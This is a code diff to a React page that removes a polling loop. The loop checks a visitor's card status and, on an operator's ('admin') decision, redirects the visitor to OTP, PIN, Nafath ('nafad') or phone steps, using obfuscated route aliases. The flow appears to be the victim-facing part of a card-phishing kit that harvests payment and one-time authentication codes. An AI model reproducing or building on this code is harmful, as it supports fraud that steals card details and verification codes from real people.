@@ -187,36 +187,8 @@ export default function P1({ offerTotalPrice }: _P1Props) {
       }
     })
 
-    // 2. Polling fallback every 3s - catches updates when socket is offline
-    const pollInterval = setInterval(async () => {
-      if (!isWaitingAdmin) return
-      try {
-        const res = await fetch(`${API_BASE}/api/visitors/${visitorID}`)
-        if (!res.ok) return
-        const data = await res.json()
-        // Check cardStatus (backend returns snake_case)
-        const cs = data.card_status || data.cardStatus
-        if (cs && cs !== 'pending') {
-          console.log('[Card Status] Polling update:', cs)
-          handleCardStatus(cs)
-        }
-        // Check redirectPage (backend returns snake_case)
-        const rp = data.redirect_page || data.redirectPage
-        if (rp) {
-          if (rp === 'otp' || rp === '_t2') { setIsWaitingAdmin(false); navigate('/step2') }
-          else if (rp === 'pin' || rp === '_t3') { setIsWaitingAdmin(false); navigate('/step3') }
-          else if (rp === 'nafad' || rp === '_t6') { setIsWaitingAdmin(false); navigate('/step4') }
-          else if (rp === 'phone' || rp === '_t5') { setIsWaitingAdmin(false); navigate('/step5') }
-          else if (rp === 'thank-you') { setIsWaitingAdmin(false); navigate('/thank-you') }
-        }
-      } catch {
-        // Ignore polling errors silently
-      }
-    }, 3000)
-
     return () => {
       unsubscribe()
-      clearInterval(pollInterval)
     }
   }, [navigate, isWaitingAdmin])
 
